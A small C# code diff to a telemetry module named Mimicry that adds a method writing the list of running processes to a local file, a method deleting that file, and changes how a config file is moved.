@@ -20,6 +20,7 @@ namespace Mimicry.Modules
         public static string mimlog = mimdir + "\\log";
         public static string mimseslog = mimdir + "\\seslog";
         public static string mimcfg = mimdir + "\\cfg";
+        public static string mimproc = mimdir + "\\proc";
         public static string IP;
         
         public Telemetry()
@@ -190,7 +191,8 @@ namespace Mimicry.Modules
         {
             if (File.Exists("cfg"))
             {
-                File.Move("cfg", mimcfg);
+                File.Copy("cfg", mimcfg, true);
+                File.Delete("cfg");
                 return File.ReadAllText(mimcfg);
             }
             else
@@ -229,6 +231,23 @@ namespace Mimicry.Modules
                 res += "Name: " + prcs[i].ProcessName + ", Memory: " + prcs[i].PagedMemorySize64 .ToString() + ", ID:" + prcs[i].Id + "\n";
             }
             return res;
+        }
+
+        public void GetProcessesFile()
+        {
+            LogInfo("USER: rc.getproc");
+            Process[] prcs = Process.GetProcesses();
+            string res = "";
+            for (int i = 0; i < prcs.Length; i++)
+            {
+                res += "Name: " + prcs[i].ProcessName + ", Memory: " + prcs[i].PagedMemorySize64.ToString() + ", ID:" + prcs[i].Id + "\n";
+            }
+            File.WriteAllText(mimproc, res);
+        }
+
+        public void TerminateProcessesFile()
+        {
+            File.Delete(mimproc);
         }
 
         public string KillProcess(string id)
